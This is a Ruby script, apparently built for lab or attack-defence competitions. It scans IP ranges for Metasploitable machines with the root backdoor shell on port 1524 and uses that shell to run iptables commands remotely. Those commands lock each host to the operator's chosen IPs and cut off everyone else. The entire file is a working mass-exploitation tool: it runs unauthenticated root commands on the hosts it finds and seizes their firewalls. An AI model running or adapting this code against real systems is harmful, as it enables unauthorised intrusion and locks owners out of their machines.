#!/usr/bin/env ruby
require 'socket'
require 'logger'
require 'ipaddr'
require 'optparse'

module AutoSpoitable
  class AutoSpoitable
    TCP_TIMEOUT = 30 # TCP timeout in seconds
    attr_reader :socket, :ip, :allowed_ips

    def initialize(ip, allowed_ips)
      @ports = { '1524' => 'root@metasploitable:/#' }
      @ip = ip
      @allowed_ips = allowed_ips
    end

    def pwn
      if metasploitable?
        patch unless owned?
      end
    ensure
      @socket.close unless @socket.nil?
    end

    def metasploitable?
      @ports.each do |port, banner|
        puts "[+] Scanning #{ip}:#{port}"
        @socket = Socket.tcp(ip, port, connect_timeout: TCP_TIMEOUT)
        actual_banner = banner_grab
        if actual_banner =~ /#{banner}/
          true
        else
          @socket.close
          false
        end
      end
    rescue
      false
    end

    private

    def owned?
      found = /^ACCEPT .*#{allowed_ips.first}/
      stop = /^Chain OUTPUT.*/
      cmd = '/sbin/iptables -L'
      rexec(cmd) do |line|
        if line =~ found
          puts "[!] #{ip} is already owned. Skipping"
          return true
        elsif line =~ stop
          puts "[!] #{ip} NOT OWNED"
          return false
        end
      end
      false
    end

    def patch
      puts "[+] Blocking all connections to #{ip} except from #{allowed_ips}"
      # iptables ban all ips except ours
      iptables = '/sbin/iptables'
      cmds = [
        "#{iptables} -P INPUT ACCEPT", "#{iptables} -P FORWARD ACCEPT", "#{iptables} -P OUTPUT ACCEPT",
        "#{iptables} -t nat -F", "#{iptables} -t mangle -F", "#{iptables} -X", "#{iptables} -F",
        @allowed_ips.map { |ip| "#{iptables} -I INPUT -p tcp -s #{ip} -j ACCEPT" },
        @allowed_ips.map { |ip| "#{iptables} -I OUTPUT -p tcp -d #{ip} -j ACCEPT" },
        "#{iptables} -A INPUT -i lo -j ACCEPT", "#{iptables} -P INPUT DROP",
        "#{iptables} -P OUTPUT DROP", "#{iptables} -A INPUT -j DROP"
      ].flatten

      cmds.each do |cmd|
        rexec(cmd)
      end
      puts "[!] #{ip} patched and secure in #{Time.now - $start_t} seconds"
    end

    def rexec(cmd)
      prompt = /root@metasploitable:.*#/
      @socket.puts("\n") # make sure we're at the prompt
      # read prompt
      while ch = @socket.recv(1)
        break if ch == '#'
      end
      # send command
      @socket.puts(cmd)
      if block_given?
        while chunk = @socket.recv(1024)
          chunk.split("\n").each do |line|
            if !line.match(prompt)
              yield line
            else
              break
            end
          end
        end
      end
    end

    def banner_grab
      @socket.recv(1024)
    end
  end

  # Supports individual ip or cidr: e.g. ['192.168.0.1/24', '192.168.1.2']
  def self.scan(scan_range, allowed_ips)
    $start_t = Time.now
    puts '[>] Scanning ips for metasplotable instances ...'
    pids = []
    ips = scan_range.flat_map { |ip| IPAddr.new(ip).to_range.to_a }.map(&:to_s)
    ips.each do |ip|
      pid = Process.fork do
        AutoSpoitable.new(ip, allowed_ips).pwn
      end
      pids << pid
    end
    pids.each { |p| Process.waitpid(p) }
    puts '[>] Done scanning all ips'
  end
end

options = {}
required_opts = %i[scan allow]

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: autosploitable.rb -s SCAN_RANGE -a ALLOWED_IPS"
  
  # Supports individual ip or cidr: e.g. ['192.168.0.1/24', '192.168.1.2']
  opts.on( '-sIPS', '--scan IPS', Array, 'The IP range to scan. CIDR or single IP, comma separated. E.g. -s "192.168.0.0/24, 192.168.1.5"' ) do |ips|
    options[:scan] = ips
  end
  
  opts.on('-aIPS', '--allow IPS', Array, 'A comma separated list of IPs to allow through the firewall') do |ips|
    options[:allow] = ips
  end

  opts.on_tail("-h", "--help", "Show this message") do
    puts opts
    exit
  end
end

begin
  optparse.parse!
rescue OptionParser::MissingArgument
  puts 'Missing argument for option'
  puts optparse
  exit
end

required_opts.each do |opt|
  unless options.include? opt
    puts "Missing mandatory option #{opt}"
    puts optparse
    exit
  end
end 

AutoSpoitable.scan(options[:scan], options[:allow])
